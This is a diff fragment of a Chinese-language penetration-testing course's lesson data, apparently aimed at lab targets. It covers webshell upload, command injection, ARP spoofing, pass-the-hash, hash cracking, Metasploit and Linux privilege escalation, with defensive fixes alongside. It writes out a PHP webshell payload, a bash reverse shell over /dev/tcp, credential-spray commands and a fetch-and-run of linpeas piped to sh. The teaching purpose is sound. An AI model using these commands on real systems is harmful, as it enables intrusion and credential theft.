+       hints:['被前端拦时，Burp 里直接把请求发到 Repeater 改文件名重放。','报错信息会泄露检测逻辑，比如「只允许 jpg/png/gif」。']},
+      {title:'两种经典绕过：改后缀、改 Content-Type',
+       cmd:'# 1) 后缀：shell.php → shell.phtml / shell.php5 / shell.PhP\n# 2) Burp 改包：Content-Type: image/png，文件名仍为 shell.php\n# payload：<?php system($_GET["c"]); ?>',
+       why:'后端如果只查 Content-Type，改一个请求头就过；如果只查黑名单后缀，换个可执行的等价后缀就过。payload 里 system($_GET[c]) 的意思是：把 URL 参数 c 当系统命令执行。',
+       out:'上传成功，页面返回文件保存路径。',
+       hints:['DVWA low 难度下任意后缀都能过，先把「正常路径」跑通，再练绕过。','上传路径通常在响应里，或 hacks 目录下，记下完整 URL。'],
+       try:{need:['content-type'], hint:'一种常见绕过是修改请求头里的文件类型声明。'}},
+      {title:'访问并执行：从文件到 shell',
+       cmd:'curl "http://192.168.56.10/hackable/uploads/shell.php?c=id"\n# 返回 uid=33(www-data) gid=33(www-data)',
+       why:'这一步证明上传点真的变成了远程命令执行。看到 www-data 就说明你以 Web 服务账号的身份在服务器上跑命令——这是整条攻击链的关键一跳，也是防守方最该堵死的地方。',
+       out:'返回命令执行结果，如 uid=33(www-data)。',
+       hints:['没执行而是显示源码，说明该目录没开 PHP 解析，需要换路径或找包含漏洞。','别急着反弹 shell，先用 id、whoami、ls 确认权限和环境。']},
+      {title:'命令注入：分号是通行证',
+       cmd:'127.0.0.1; id\n127.0.0.1 | whoami\n127.0.0.1 && cat /etc/passwd\n`id`',
+       why:'程序以为自己在 ping，实际把整串交给了 shell。分号表示「执行完前一个再执行后一个」，管道把前一个的输出给后一个，反引号直接执行。只要输入没被严格限制，这些符号就是你的命令拼接器。',
+       out:'页面上同时出现 ping 结果和 id 的输出。',
+       hints:['空格被过滤时用 ${IFS} 代替，或用 $() 包裹。','回显被吃掉就做盲注：sleep 5 看响应时间，或 curl 把结果外带。'],
+       try:{need:[';'], hint:'在合法 IP 后面加一个命令分隔符，再接一条系统命令。'}},
+      {title:'修复：从「过滤」升级到「不执行」',
+       cmd:'# 上传：白名单 + 随机改名 + 存到不可执行目录 + 关闭该目录脚本解析\n# 命令：用参数化 API（如 Python subprocess 列表形式），禁止拼接 shell',
+       why:'最好的修复不是「过滤危险字符」，而是让危险不可能发生：文件根本不在 Web 目录里、文件名不可控、目录不允许执行 PHP；命令调用不经过 shell，参数只当字符串。',
+       out:'上传的 php 文件无法被解析；注入符号只被当作普通参数。',
+       hints:['Nginx 里对 upload 目录单独配置 location，去掉 fastcgi_pass，脚本就不会执行。','别把用户文件名直接拼进路径，否则还有目录穿越（../../）。']}
+    ],
+    pitfalls:[
+      '只测前端校验就以为「有防护」。',
+      '上传成功但路径找不到——记得看响应、看目录扫描结果。',
+      '在授权测试里留下 webshell 不删，属于严重违规。'
+    ],
+    quiz:{q:'下面哪种修复对文件上传最有效？',
+      opts:['前端 JS 检查后缀名','后端黑名单过滤 .php','白名单校验 + 随机重命名 + 上传目录禁止脚本执行','把上传目录改名成 uploads'],
+      a:2, exp:'白名单限制类型、改名让路径不可预测、目录不解析脚本——三层叠加才能让「上传」无法变成「执行」。前端和黑名单都能被绕过。'}
+  }
+  ]
+},
+
+/* ================= 第 3 章 ================= */
+{
+  id:'m3', no:'3', icon:'🕸️', name:'网络与内网：横向移动的艺术', short:'网络与内网',
+  desc:'抓包看懂协议，理解中间人为什么能成立，以及拿到一台机器后怎么继续往里走。',
+  lessons:[
+  {
+    id:'l3-1', title:'抓包与中间人：为什么 HTTPS 救了你', time:'35 分钟', level:'进阶',
+    tags:['tcpdump','Wireshark','ARP','MITM'],
+    goal:[
+      '用 tcpdump 抓包、用 Wireshark 读握手过程',
+      '说清 ARP 欺骗的原理与前提',
+      '解释 TLS 如何让中间人「看得见但改不了」'
+    ],
+    concepts:[
+      {t:'抓包', d:'网卡在混杂模式下能看到经过它的所有帧。有交换机后需要端口镜像、ARP 欺骗或本机抓包才能看到别人的流量。'},
+      {t:'ARP 欺骗', d:'ARP 没有认证，谁回答「我是网关」谁就是网关。攻击者抢答后，流量就绕道他这里。'},
+      {t:'TLS 的作用', d:'即使流量被中间人转发，客户端会校验证书链和域名。伪造证书会报警告——所以抓 HTTPS 要么装根证书，要么只能看到 SNI 和流量大小。'}
+    ],
+    steps:[
+      {title:'抓一段明文 HTTP 流量',
+       cmd:'sudo tcpdump -i eth0 -nn port 80 -w http.pcap',
+       why:'-i 指定网卡，-nn 不做域名和端口解析（更快更清晰），-w 直接写 pcap 文件给 Wireshark 读。先抓明文，你才能看清 HTTP 到底长什么样。',
+       out:'当前目录生成 http.pcap；停止后 tcpdump 显示 captured N packets。',
+       hints:['不知道网卡名就 ip a 看，通常是 eth0 或 ens33。','想实时看内容：sudo tcpdump -i eth0 -A port 80。'],
+       try:{need:['tcpdump','-w'], hint:'用 tcpdump 把包写入文件，需要 -i 和 -w。'}},
+      {title:'在 Wireshark 里读三次握手',
+       cmd:'wireshark http.pcap\n# 过滤器：http.request.method == "POST"\n# 追踪流：右键 → Follow → HTTP Stream',
+       why:'SYN → SYN/ACK → ACK 是 TCP 的连接建立。看懂了流，你才知道一个登录请求在哪一行带着明文密码。Follow Stream 把整个会话拼成可读文本，是取证和排障的常用手法。',
+       out:'能在流里看到请求头、表单数据、响应正文。',
+       hints:['过滤器写 tcp.port==80 也能过滤，但 http 过滤器更精准。','看到 password=xxx 明文，就是「为什么必须上 HTTPS」最直观的证据。']},
+      {title:'理解 ARP 欺骗的攻击条件',
+       cmd:'sudo arpspoof -i eth0 -t 192.168.56.10 192.168.56.1\n# 同时开启转发：sudo sysctl -w net.ipv4.ip_forward=1',
+       why:'-t 指定受害者，最后一个是冒充的对象（网关）。必须开 IP 转发，否则受害者会直接断网而不是「被透明转发」——断网会立刻被发现，透明才叫中间人。',
+       out:'受害者机器上 arp -a 看到的网关 MAC 变成了攻击者网卡。',
+      hints:['只能在你自己搭的虚拟内网里做，真实办公网做这个是违法的。','HTTPS 站点会弹证书警告，这正是防护生效的表现。'],
+       try:{need:['arpspoof'], hint:'做 ARP 欺骗的经典工具名。'}},
+      {title:'从防守方看：怎么发现和阻止',
+       cmd:'# 检测：arpwatch / 静态 ARP 绑定 / 交换机 DAI\n# 阻止：全站 HTTPS + HSTS + 证书固定',
+       why:'中间人能成功，根因是「ARP 无认证」和「HTTP 无加密」。防守方要么在二层做动态 ARP 检测，要么在应用层让明文没有价值——这两条思路适用于几乎所有网络攻击。',
+       out:'能说出至少两条检测手段和两条防护手段。',
+       hints:['HSTS 让浏览器以后只走 HTTPS，避免被降级攻击。','企业网里 DHCP Snooping + DAI 是标配，个人网络至少可以绑定静态 ARP。']}
+    ],
+    pitfalls:[
+      '忘了开 IP 转发，受害者直接断网，攻击瞬间暴露。',
+      '以为抓到 HTTPS 就能看到内容——没有私钥或客户端信任的假证书，只能看到元数据。',
+      '在真实网络里练 ARP 欺骗，直接构成破坏计算机信息系统。'
+    ],
+    quiz:{q:'ARP 欺骗能成功，根本原因是？',
+      opts:['交换机性能不足','ARP 协议没有身份认证机制，谁应答就信谁','TCP 三次握手有缺陷','因为目标没装杀毒软件'],
+      a:1, exp:'ARP 是「谁喊得响就信谁」的协议。防护靠二层检测（DAI）、静态绑定，以及用 HTTPS 让被转发的明文失去价值。'}
+  },
+  {
+    id:'l3-2', title:'内网横向：拿到一台机器之后', time:'45 分钟', level:'进阶',
+    tags:['SMB','netexec','哈希传递','域'],
+    goal:[
+      '用 netexec 批量探测内网 SMB 与登录凭据',
+      '理解 pass-the-hash 为什么不需要明文密码',
+      '说出内网分段与最小权限的防守逻辑'
+    ],
+    concepts:[
+      {t:'横向移动', d:'从一台已控主机出发，用它的凭据、信任关系去控制更多主机。真实入侵很少一步到位，都是这样一跳一跳走进去的。'},
+      {t:'NTLM 哈希', d:'Windows 存的是密码哈希，认证时用哈希参与挑战应答。所以拿到哈希就能直接登录——不需要破解出明文。'},
+      {t:'凭据复用', d:'同一个本地管理员密码铺满全公司，是最常见的内网致命问题。一台沦陷等于全部沦陷。'}
+    ],
+    steps:[
+      {title:'先摸清内网有哪些 Windows 主机',
+       cmd:'nxc smb 192.168.56.0/24\n# 旧版命令为 crackmapexec smb 192.168.56.0/24',
+       why:'它会尝试 SMB 协商并读取主机名、域、SMB 签名状态。签名未开启的主机可以做中继攻击；主机名和域信息能帮你画出内网结构图。',
+       out:'每台主机一行，含 IP、主机名、域、签名状态。',
+       hints:['只在内网授权范围扫，别把整个公司网段都扫了。','看到 signing:False 就记下来，这是中继攻击的候选目标。'],
+       try:{need:['smb'], hint:'工具后面要跟 smb 协议模块和网段。'}},
+      {title:'用一组凭据试遍全网（凭据复用检测）',
+       cmd:"nxc smb 192.168.56.0/24 -u administrator -p 'Password123' --continue-on-success",
+       why:'这不是爆破，而是验证「一个密码是不是到处都能用」。--continue-on-success 让你看到所有成功的主机，而不是第一台就停。企业里这一步常常一次命中几十台。',
+       out:'行尾出现 (Pwn3d!) 表示该账号是本地管理员。',
+      hints:['只在明确授权的内网做，这是入侵行为里最敏感的一步。','拿到 (Pwn3d!) 的主机可以用 -x 执行命令，进一步取证。'],
+       try:{need:['-u','-p'], hint:'需要指定用户名和密码两个参数。'}},
+      {title:'理解哈希传递（PtH）',
+       cmd:"nxc smb 192.168.56.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+       why:'Windows 认证用哈希做挑战应答，所以有哈希就能登录。-H 直接传哈希，不需要知道明文密码。这就是为什么「抓哈希」在实战中和「抓密码」等价，也是为什么域管账号绝不能登录普通工作站。',
+       out:'返回成功，且权限与用明文密码登录一致。',
+       hints:['哈希形如 LM:NT，通常只需要后半段 NT 哈希。','防御手段：开启 Credential Guard、禁用 NTLM、LAPS 让每台机器密码不同。'],
+       try:{need:['-h'], hint:'传哈希的参数是大写 H。'}},
+      {title:'站在防守方：把横向的路堵死',
+       cmd:'# 1) LAPS：每台机器本地管理员密码随机化\n# 2) 分层：域管只登域控，不进工作站\n# 3) 网络分段 + 主机防火墙限制 445\n# 4) 开 SMB 签名，禁 NTLMv1',
+       why:'横向移动依赖「凭据可复用」和「网络可达」。打掉任何一个，攻击链就断。这也是为什么真实防守里，资产梳理和权限治理比买设备更有效。',
+       out:'能针对每条路径说出对应的阻断措施。',
+       hints:['攻击链思维：初始访问 → 执行 → 持久化 → 提权 → 横向 → 外传。每一环都能设防。','检测思路：短时间内同一账号登录多台主机，就是典型告警。']}
+    ],
+    pitfalls:[
+      '把「凭据复用检测」做成大规模爆破，直接把域账号锁死，业务中断。',
+      '不做范围确认就在生产网跑，几秒钟就能触发 SOC 告警。',
+      '拿到权限后到处留痕（新建账号、装服务），取证时一眼就被发现。'
+    ],
+    quiz:{q:'为什么攻击者拿到 NTLM 哈希就能直接登录？',
+      opts:['因为哈希可以反推出明文密码','因为 Windows 认证用哈希参与挑战应答，不需要明文','因为哈希就是密码的另一种写法','因为管理员权限可以跳过认证'],
+      a:1, exp:'NTLM 认证过程中，客户端用哈希计算应答值。所以持有哈希即可完成认证，这就是 pass-the-hash。防御要靠 Credential Guard、LAPS、禁用 NTLM。'}
+  }
+  ]
+},
+
+/* ================= 第 4 章 ================= */
+{
+  id:'m4', no:'4', icon:'🔑', name:'口令与密码学', short:'口令与密码学',
+  desc:'哈希识别与破解的真实原理，TLS 的常见误用，以及为什么「加盐 + 慢哈希」是唯一正解。',
+  lessons:[
+  {
+    id:'l4-1', title:'哈希识别与破解：字典攻击到底在做什么', time:'35 分钟', level:'入门',
+    tags:['hashcat','john','rockyou','加盐'],
+    goal:[
+      '区分哈希与加密，认出常见哈希类型',
+      '用 john / hashcat 跑一次字典攻击',
+      '解释加盐与慢哈希如何让破解变得不划算'
+    ],
+    concepts:[
+      {t:'哈希不是加密', d:'哈希是单向的，不可逆。所谓「破解哈希」其实是「猜一个候选密码，算它的哈希，比对是否相同」。'},
+      {t:'字典攻击', d:'拿常见密码列表逐个算哈希比对。rockyou.txt 有 1400 万条真实泄露密码，命中率高得惊人。'},
+      {t:'加盐', d:'给每个密码拼一段随机值再哈希。同样的密码在不同用户那里哈希不同，彩虹表和批量破解直接失效。'},
+      {t:'慢哈希', d:'bcrypt / scrypt / Argon2 故意算得慢。GPU 一秒能算百亿次 MD5，但只能算几千次 bcrypt——防御的成本转嫁给了攻击者。'}
+    ],
+    steps:[
+      {title:'先认清手里是什么哈希',
+       cmd:'echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt\nhashid -m hash.txt\nhash-identifier',
+       why:'32 位十六进制可能是 MD5，40 位是 SHA1，$2y$ 开头是 bcrypt，$6$ 是 SHA512-crypt。类型判断错了，后面所有破解都是白跑。',
+       out:'hashid 给出可能的算法列表和对应的 hashcat -m 编号。',
+       hints:['看前缀和长度最快：$1$=MD5-crypt，$2a$=bcrypt，$6$=SHA512-crypt。','不确定就用 hashid 的 -m 参数，它直接告诉你 hashcat 该用哪个模式号。'],
+       try:{need:['hashid'], hint:'专门识别哈希类型的工具。'}},
+      {title:'用 john 跑一次字典攻击',
+       cmd:'john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt\njohn --show hash.txt',
+       why:'john 会逐个取字典里的词、算 MD5、和你的哈希比对。--format 明确算法能大幅提速。跑完用 --show 看结果——它会把明文和已破解状态列出来。',
+       out:'屏幕上出现 password（或类似明文），--show 显示 1 password hash cracked。',
+      hints:['rockyou 是压缩包，先 gunzip /usr/share/wordlists/rockyou.txt.gz。','不知道格式时先不带 --format 跑一次，john 会自动识别。'],
+       try:{need:['john','--wordlist'], hint:'john 需要指定字典文件。'}},
+      {title:'换 hashcat，感受 GPU 的暴力',
+       cmd:'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n# -m 0=MD5  -a 0=字典模式\nhashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a',
+       why:'-m 指定哈希类型，-a 指定攻击模式（0 字典、3 掩码）。掩码 ?a?a?a?a?a?a 表示穷举 6 位任意字符。GPU 每秒百亿次的速度，让 8 位以下的纯数字密码几秒钟就没了。',
+       out:'状态显示 Cracked，hashcat.potfile 里能看到结果。',
+      hints:['虚拟机里没有 GPU 会慢很多，学习阶段用 john 就够。','--show 可以事后查看已破解结果，不用重跑。'],
+       try:{need:['hashcat','-m'], hint:'hashcat 必须指定哈希类型模式 -m。'}},
+      {title:'理解防御：为什么现代系统不该用 MD5',
+       cmd:'# 反面：md5(password)\n# 正面：bcrypt / argon2id，cost=12 以上\npython3 -c "import bcrypt; print(bcrypt.hashpw(b\'test\', bcrypt.gensalt(12)))"',
+       why:'加盐让同样的密码得到不同哈希，慢哈希让每次尝试都变贵。当破解一个密码需要几个月时，攻击者就会放弃——安全的本质是「让攻击成本高于收益」，不是「无法破解」。',
+       out:'每次运行得到的 bcrypt 哈希都不一样（盐不同），且计算有明显延迟。',
+       hints:['盐必须随机、每个用户独立、和哈希一起存。','别再自己发明加密算法，用库里的标准实现。']}
+    ],
+    pitfalls:[
+      '把哈希当加密，以为能「解密」回来。',
+      '用在线网站查哈希——等于把公司密码哈希上传给陌生人。',
+      '生产系统用 MD5/SHA1 存密码，还觉得「加了盐就安全」。'
+    ],
+    quiz:{q:'加盐（salt）能防住哪种攻击？',
+      opts:['防止哈希被算出明文','让相同密码产生不同哈希，使彩虹表和批量破解失效','让哈希算法变成可逆','防止暴力破解单条哈希'],
+      a:1, exp:'盐不改变「可被逐个猜」的事实，但会让预计算表失效、无法批量破解相同密码。要抵抗暴力破解还得靠慢哈希（bcrypt/Argon2）。'}
+  },
+  {
+    id:'l4-2', title:'TLS 体检：证书、套件与那些「先关掉校验」的坑', time:'30 分钟', level:'进阶',
+    tags:['TLS','openssl','testssl','证书'],
+    goal:[
+      '用 openssl 手工看一次 TLS 握手与证书链',
+      '识别过期、自签、弱套件三类常见问题',
+      '解释证书固定与 HSTS 各自解决什么'
+    ],
+    concepts:[
+      {t:'证书链', d:'服务器证书 → 中间 CA → 根 CA。客户端只要信任根，就能验证整条链。链不全时部分客户端会报错。'},
+      {t:'SNI', d:'TLS 握手时客户端明说「我要访问哪个域名」。所以即使加密，中间人仍能知道你访问了哪个站。'},
+      {t:'证书固定（pinning）', d:'App 内置只信任特定证书/公钥。这样即使系统被装了恶意根证书，中间人也无法解密。'}
+    ],
+    steps:[
+      {title:'手工看一次握手',
+       cmd:'openssl s_client -connect example.com:443 -servername example.com -showcerts',
+       why:'-servername 传 SNI，否则共享 IP 的服务器会返回默认证书。-showcerts 打印整条证书链。你能直接看到协议版本、加密套件、证书主题和有效期。',
+       out:'输出 Verify return code: 0 (ok)，以及证书的 subject / issuer / 有效期。',
+       hints:['结尾按 Ctrl+C 或输入 Q 退出交互。','想看证书细节：echo | openssl s_client -connect host:443 2>/dev/null | openssl x509 -noout -text。'],
+       try:{need:['s_client'], hint:'openssl 里做客户端连接测试的子命令。'}},
+      {title:'检查有效期与主机名',
+       cmd:'echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates -subject -issuer',
+       why:'证书过期是最常见的「网站打不开」原因，而证书域名不匹配会直接触发浏览器红色警告。运维排查和渗透评估都要先看这两项。',
+       out:'notBefore / notAfter 两个日期，subject 里的 CN 与访问域名一致。',
+       hints:['时间不对也可能是服务器时钟漂移，别只怀疑证书。','自签证书的 issuer 和 subject 会一样，这是明显特征。']},
+      {title:'一把梭：自动体检报告',
+       cmd:'testssl.sh --fast https://example.com\n# 或 nmap --script ssl-enum-ciphers -p 443 example.com',
+       why:'它会列出支持的协议版本、弱套件（RC4、3DES、CBC）、心脏出血、证书问题。看报告重点找：TLS 1.0/1.1 是否还开着、有没有 EXPORT 级套件、证书是否即将过期。',
+       out:'一份分级报告，问题项标红（CRITICAL / HIGH）。',
+       hints:['testssl.sh 在 Kali 里可以直接装：apt install testssl.sh。','报告里「OK」不代表业务安全，只代表传输层没明显问题。']},
+      {title:'常见的「自己坑自己」',
+       cmd:'# 反例：curl -k / verify=False / TrustAllCerts\n# 正例：内置 CA、开启 HSTS、对关键接口做 pinning',
+       why:'开发为了省事关掉证书校验，等于把 HTTPS 降级成 HTTP——中间人换一张任意证书都能通过。这是移动端和内部系统里最普遍、也最容易被利用的漏洞。',
+       out:'能在代码或配置里找出所有跳过校验的位置。',
+       hints:['搜索关键词：verify=False、TrustAllCerts、ALLOW_ALL_HOSTNAME_VERIFIER。','HSTS 负责「以后只走 HTTPS」，pinning 负责「只信这张证书」，两者互补。']}
+    ],
+    pitfalls:[
+      '用 -k / verify=False 解决证书报错，把风险留到生产。',
+      '只看证书有效期，不看套件强度。',
+      '以为上了 HTTPS 就安全——应用层漏洞照样存在。'
+    ],
+    quiz:{q:'开发在代码里写 verify=False 跳过证书校验，最直接的后果是？',
+      opts:['连接会变慢','中间人可以出示任意证书而不被察觉，HTTPS 形同虚设','服务器会拒绝连接','证书会自动续期'],
+      a:1, exp:'跳过校验等于放弃身份验证，攻击者用自签证书即可解密全部流量。正确做法是修复证书链，而不是关掉检查。'}
+  }
+  ]
+},
+
+/* ================= 第 5 章 ================= */
+{
+  id:'m5', no:'5', icon:'💥', name:'漏洞利用与提权', short:'漏洞利用与提权',
+  desc:'从版本号到 CVE 到 shell 的完整链路，以及拿到低权限后怎么找提权路径。',
+  lessons:[
+  {
+    id:'l5-1', title:'从 CVE 到 shell：一次完整的利用链', time:'45 分钟', level:'进阶',
+    tags:['searchsploit','Metasploit','反弹shell'],
+    goal:[
+      '用 searchsploit 把版本号变成可用的 exploit',
+      '走通 msfconsole 的 search → use → set → run 流程',
+      '解释反弹 shell 为什么要「目标主动连回来」'
+    ],
+    concepts:[
+      {t:'CVE 与利用代码', d:'CVE 是漏洞编号，exploit 是能真正打进去的代码。两者之间常有鸿沟：版本对不上、环境不匹配、需要特定配置。'},
+      {t:'反弹 shell', d:'让目标主动连接你的监听端口。因为目标通常能被出网，但你连不进去（NAT、防火墙）。方向反了，路就通了。'},
+      {t:'Payload 类型', d:'reverse_tcp 最常用；bind_tcp 适合目标不能出网；staged（分阶段）体积小但需要稳定连接，stageless 更稳。'}
+    ],
+    steps:[
+      {title:'把版本号变成 exploit 列表',
+       cmd:'searchsploit apache 2.4.49\nsearchsploit -m 50383   # 把 exploit 复制到当前目录',
+       why:'searchsploit 查的是本地 ExploitDB 库，离线可用。-m 把利用代码复制出来，方便你读源码、改参数。读得懂 exploit 才能改得动它。',
+       out:'一张表：Exploit Title / Path / 类型（remote / local / webapps）。',
+       hints:['先 searchsploit -u 更新库，否则可能是几年前的旧数据。','看到 (Metasploit) 标记说明 msf 里直接有模块，更省事。'],
+       try:{need:['searchsploit'], hint:'离线查 exploit 数据库的工具。'}},
+      {title:'走一遍 Metasploit 的标准流程',
+       cmd:'msfconsole -q\nsearch cve:2021-41773\nuse exploit/multi/http/apache_normalize_path_rce\nset RHOSTS 192.168.56.10\nset LHOST 192.168.56.5\nset LPORT 4444\nrun',
+       why:'search 找模块，use 选中，set 填参数，run 执行。RHOSTS 是目标，LHOST 是你自己的 IP（反弹回来找谁），LPORT 是你的监听端口。把这四个参数记牢，80% 的模块都能跑。',
+       out:'出现 Meterpreter session 1 opened，进入 meterpreter > 提示符。',
+      hints:['show options 看哪些参数是 Required 且没填。','LHOST 填错是最常见的失败原因——别填 127.0.0.1。'],
+       try:{need:['use','set','run'], hint:'四个关键动作：选模块、设参数、执行。'}},
+      {title:'手工验证反弹 shell',
+       cmd:'# 攻击机：nc -lvnp 4444\n# 目标上执行：bash -i >& /dev/tcp/192.168.56.5/4444 0>&1',
+       why:'bash -i 开交互式 shell，>& 把标准输出和错误重定向到 TCP 连接，0>&1 把标准输入也接过去。三条流都接上，你才有一个能敲命令的 shell，而不是只能看输出。',
+       out:'监听端出现目标主机的 shell 提示符，能执行 id。',
+       hints:['/dev/tcp 是 bash 特性，sh 里不可用；换 python 或 nc -e 的写法。','先在本机两个终端之间试通，再去打靶机。'],
+       try:{need:['nc','-lvnp'], hint:'先在攻击机起一个监听：nc 加监听参数和端口。'}},
+      {title:'收尾：清理痕迹与写报告',
+       cmd:'# 记录：时间线、命令、证据、影响范围\n# 清理：删除上传文件、结束自己起的进程、还原配置',
+       why:'一次专业的测试，交付物是报告不是 shell。要写清「怎么进来的、能造成什么影响、怎么修」。留下 webshell 或后门，是最不专业也最危险的行为。',
+       out:'一份含复现步骤、风险等级、修复建议的报告草稿。',
+       hints:['影响要写业务语言：能读多少用户数据、能否篡改订单。','修复建议要具体到配置项和代码位置。']}
+    ],
+    pitfalls:[
+      '到处乱跑 exploit 不看目标版本，把服务打崩。',
+      'LHOST 填 127.0.0.1，永远收不到回连。',
+      '打完不清理、不写报告，客户不知道风险在哪。'
+    ],
+    quiz:{q:'为什么大多数情况下要用「反弹」shell 而不是 bind shell？',
+      opts:['反弹更快','因为目标通常能出网，但外部无法直接连入（NAT/防火墙）','因为 bind shell 不稳定','因为反弹不需要端口'],
+      a:1, exp:'内网主机通常允许出站、禁止入站。让目标主动连回来，绕过了入站限制；bind shell 需要在目标上开监听端口，常被防火墙挡住。'}
+  },
+  {
+    id:'l5-2', title:'Linux 提权：把 www-data 变成 root', time:'40 分钟', level:'进阶',
+    tags:['提权','SUID','sudo','linpeas'],
+    goal:[
+      '用 id / sudo -l 快速判断当前权限与可用路径',
+      '找出危险的 SUID 文件并理解其原理',
+      '说出四条通用提权思路和对应的加固手段'
+    ],
+    concepts:[
+      {t:'提权本质', d:'不是「破解 root 密码」，而是找到一个以更高权限运行、且你能影响其行为的程序。'},
+      {t:'SUID', d:'文件带 s 位时，任何人执行都以文件属主身份运行。root 属主的 SUID 程序 = 以 root 执行的机会。'},
+      {t:'sudo 配置错误', d:'允许 www-data 无密码执行 vim、find、tar，等于给了 root——因为这些程序都能逃出 shell。'}
+    ],
+    steps:[
+      {title:'先问三个问题：我是谁、能干什么、系统多老',
+       cmd:'id\nsudo -l\nuname -a && cat /etc/os-release',
+       why:'id 看自己在哪些组（docker 组等于 root）；sudo -l 看能免密跑什么；内核版本决定有没有脏牛这类内核提权漏洞。这三条命令 10 秒内给出方向。',
+       out:'uid/gid 列表、sudo 允许的命令清单、内核版本号。',
+       hints:['在 docker 组里？直接 docker run -v /:/mnt -it alpine chroot /mnt sh。','sudo -l 需要密码时，先看有没有免密条目。'],
+       try:{need:['sudo','-l'], hint:'列出当前用户可用的 sudo 权限。'}},
+      {title:'找 SUID：藏在系统里的「以 root 运行」',
+       cmd:'find / -perm -4000 -type f 2>/dev/null\n# 对照 GTFOBins 查利用方式',
+       why:'-perm -4000 精确匹配 SUID 位，2>/dev/null 丢掉满屏的权限错误。找到非常规 SUID 程序（比如 nmap、vim、find）基本就赢了——它们都能执行任意命令。',
+       out:'一串路径，其中出现 nmap、find、vim、less 等就值得深入。',
+       hints:['GTFOBins 是这类利用的速查表，搜程序名就有现成命令。','标准系统里 passwd、sudo、mount 带 SUID 是正常的，别激动。'],
+       try:{need:['-perm','-4000'], hint:'用 find 找权限位含 SUID 的文件。'}},
+      {title:'用自动化脚本把遗漏捡起来',
+       cmd:'./linpeas.sh | tee linpeas.log\n# 或：wget -qO- https://example/linpeas.sh | sh',
+       why:'linpeas 会系统性地检查 sudo 规则、SUID、可写服务配置、定时任务、凭据文件、内核 CVE。它把「人工翻几百个点」压缩成几分钟，但报告要自己复核，误报不少。',
+       out:'一堆红色/黄色高亮的可疑项，按风险排序。',
+       hints:['先看红色的 95% 权限项，再看黄色。','别在真实环境直接 curl | sh，先把脚本下载下来读一遍。']},
+      {title:'站在防守方：让提权变难',
+       cmd:'# 1) 及时打内核补丁\n# 2) 清理不必要的 SUID\n# 3) sudo 只授权具体命令，禁用 shell 逃逸\n# 4) 服务以专用低权限账号运行，不写可执行目录',
+       why:'提权成功往往不是因为「0day」，而是配置疏忽。把「谁能以什么身份运行什么」收窄，攻击者的路就断了。这也是等保、CIS 基线里反复强调的内容。',
+       out:'一份可执行的加固清单。',
+       hints:['审计命令：sudo -l -U 用户名，逐个确认。','Web 目录可写 + 服务可执行 = 直接 getshell，务必分离。']}
+    ],
+    pitfalls:[
+      '看到 SUID 就用，不看是否真能利用，浪费时间。',
+      '在目标上跑一堆脚本，产生大量日志和临时文件，暴露自己。',
+      '提权后立刻改密码、删日志——这在授权测试里是重大违规。'
+    ],
+    quiz:{q:'发现 /usr/bin/find 带 SUID 且属主是 root，为什么危险？',
+      opts:['因为它能删除文件','因为 find 支持 -exec，能以 root 身份执行任意命令','因为它是系统文件','因为 SUID 会自动同步到其他文件'],
+      a:1, exp:'带 SUID 的 find 以 root 身份运行，find . -exec /bin/sh -p \\; 就能拿到 root shell。这类「本身能执行命令」的程序一旦 SUID，等于后门。'}
+  }
+  ]
+},
+
+/* ================= 第 6 章 ================= */
+{
+  id:'m6', no:'6', icon:'🔬', name:'逆向与二进制', short:'逆向工程',
+  desc:'不靠源码看懂程序在干什么：从 file、strings 到 gdb 断点，再到 Ghidra 反编译。',
+  lessons:[
+  {
+    id:'l6-1', title:'读懂一个二进制：file → strings → gdb', time:'40 分钟', level:'进阶',
+    tags:['gdb','strings','checksec','crackme'],
+    goal:[
+      '用四条命令快速判断一个程序是什么、有没有保护',
+      '用 strace / ltrace 观察程序运行时在做什么',
+      '在 gdb 里下断点，找到关键比较指令'
+    ],
+    concepts:[
+      {t:'静态 vs 动态', d:'静态是「不运行，直接读文件」（strings、反汇编）；动态是「跑起来看行为」（gdb、strace）。两条路互相印证。'},
+      {t:'保护机制', d:'Canary 防栈溢出、NX 让栈不可执行、PIE 随机化地址、RELRO 保护 GOT 表。checksec 一眼看完，决定你该怎么打。'},
+      {t:'断点', d:'让程序停在某条指令前，此时可以看寄存器、看内存、单步执行。逆向的核心动作就是「停下来看」。'}
+    ],
+    steps:[
+      {title:'先认文件、再看保护',
+       cmd:'file ./crackme\nchecksec --file=./crackme\nreadelf -h ./crackme | head -20',
+       why:'file 告诉你架构（x86-64 / ARM）和是否静态链接；checksec 列出四种保护；readelf 看入口点和类型。这一步决定了你后面用 gdb 还是 Ghidra、能不能直接改内存。',
+       out:'ELF 64-bit LSB executable, x86-64；保护项一列 Yes/No。',
+       hints:['PIE 开启时地址会变，gdb 里要用 break *main 而不是绝对地址。','静态链接的程序很大，函数多，先从 main 附近的调用看。'],
+       try:{need:['checksec'], hint:'查保护机制的那个脚本叫什么？'}},
+      {title:'strings：把程序里的「人话」捞出来',
+       cmd:'strings -n 6 ./crackme | less\nstrings ./crackme | grep -iE "password|flag|wrong|correct"',
+       why:'程序里的提示语、错误信息、硬编码密钥都是明文字符串。看到 Enter password 和 Wrong 就知道校验逻辑在哪；有时 flag 直接躺在里面。',
+       out:'一串可读字符串，其中包含提示语或可疑常量。',
+       hints:['-n 控制最小长度，默认 4，调大能过滤噪音。','静态链接的 Go 程序字符串极多，配合 grep 定向找。'],
+       try:{need:['strings'], hint:'提取可打印字符串的命令。'}},
+      {title:'跑起来看它调用了什么',
+       cmd:'ltrace ./crackme\nstrace -f ./crackme',
+       why:'ltrace 跟踪库函数调用（strcmp、printf），strace 跟踪系统调用（read、open、write）。crackme 里一出现 strcmp，你的输入就正在被比较——那就是关键点。',
+       out:'能看到 strcmp("test", "s3cr3t") 这类调用，明文就在参数里。',
+       hints:['ltrace 看不到时可能是静态链接，改用 gdb 下断点。','strace -e trace=openat 只看文件操作，噪音小很多。'],
+       try:{need:['ltrace'], hint:'跟踪库函数调用的工具。'}},
+      {title:'在 gdb 里下断点，读到比较的两边',
+       cmd:'gdb -q ./crackme\n(gdb) disassemble main\n(gdb) break *main+64\n(gdb) run\n(gdb) info registers rdi rsi\n(gdb) x/s $rdi',
